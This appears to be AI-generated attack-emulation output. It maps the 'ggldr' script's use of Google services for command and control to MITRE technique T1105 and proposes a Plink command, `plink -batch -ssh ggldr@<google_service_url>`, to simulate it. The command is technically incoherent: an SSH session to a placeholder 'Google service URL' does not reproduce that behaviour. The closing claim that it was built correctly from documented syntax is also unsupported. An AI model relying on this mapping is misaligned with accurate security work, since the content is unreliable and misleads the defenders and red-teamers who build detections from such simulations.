Based on the provided documentation, I will construct realistic command lines to simulate the attack behavior using only the tool Plink.

**Attack Behavior:** The "ggldr" script is responsible for transferring commands and receiving data through the use of Google services.

**MITRE Technique and Tactic:**

* Technique ID: T1105
* Technique name: INGRESS TOOL TRANSFER
* Tactic ID: TA0011
* Tactic name: COMMAND AND CONTROL

Here's the command line:

Command: `plink -batch -ssh ggldr@<google_service_url>`

This command uses the `-batch` option to disable interactive prompts, simulating a script that transfers commands and receives data through Google services. The `<google_service_url>` placeholder should be replaced with an actual URL, if available.

Please note that I have not copied generic examples from the documentation and have instead constructed the command line using only the documented syntax and capabilities of Plink.
